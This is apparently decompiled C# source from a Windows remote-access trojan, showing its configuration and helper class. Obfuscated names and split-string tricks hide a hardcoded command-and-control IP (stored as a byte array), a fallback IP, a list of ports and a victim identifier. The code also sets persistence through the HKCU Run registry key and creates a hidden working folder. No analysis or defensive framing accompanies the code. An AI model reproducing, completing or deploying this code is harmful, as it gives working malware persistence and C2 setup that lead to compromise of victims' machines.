using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace igtmntina;

internal static class DAAONIF
{
	public static byte[] igtmntinavpsips = new byte[13]
	{
		49, 48, 55, 46, 49, 55, 53, 46, 49, 46,
		49, 48, 51
	};

	public static int igtmntinaport;

	public static string igtmntinapc_id = "rakmas|igtmntina".Split(new char[1] { '|' })[0];

	public static string igtmntinaremvUser = "klhumanc|igtmntina".Split(new char[1] { '|' })[0];

	public static string igtmntinadefaultP = "122.15.210.128|igtmntina".Split(new char[1] { '|' })[0];

	public static string igtmntinafilesLogs = "dhmwkrw".Split(new char[1] { '|' })[0];

	public static string igtmntinaAppPath = "";

	public static string igtmntinamyPath = Application.get_ExecutablePath().ToString();

	public static string igtmntinaFile = Path.GetFileName(igtmntinamyPath)!.Split(new char[1] { '.' })[0];

	public static string igtmntinaappPath = "\\Mklsurc\\|igtmntina".Split(new char[1] { '|' })[0];

	public static string igtmntinamainApp = "igtmntina".ToString();

	public static int[] ports = new int[5] { 3268, 5418, 7646, 9348, 14686 };

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string igtmntinaOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1".ToString();
		}
	}

	public static void igtmntinaset_run(string app, string path)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|igtmntina".Split(new char[1] { '|' })[0].ToString(), writable: true);
			object value = registryKey.GetValue(igtmntinapc_id + app);
			if (value == null)
			{
				registryKey.SetValue(igtmntinapc_id + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(igtmntinapc_id + app, path);
			}
		}
		catch
		{
		}
	}

	public static string igtmntinaget_mpath()
	{
		if (igtmntinaAppPath != "")
		{
			return igtmntinaAppPath;
		}
		igtmntinaAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + igtmntinaappPath;
		try
		{
			if (!Directory.Exists(igtmntinaAppPath))
			{
				Directory.CreateDirectory(igtmntinaAppPath);
			}
			if (Directory.Exists(igtmntinaAppPath))
			{
				return igtmntinaAppPath;
			}
			igtmntinaAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + igtmntinaappPath;
			if (!Directory.Exists(igtmntinaAppPath))
			{
				Directory.CreateDirectory(igtmntinaAppPath);
			}
			if (!Directory.Exists(igtmntinaAppPath))
			{
				return igtmntinaAppPath;
			}
		}
		catch
		{
		}
		return igtmntinaAppPath;
	}
}
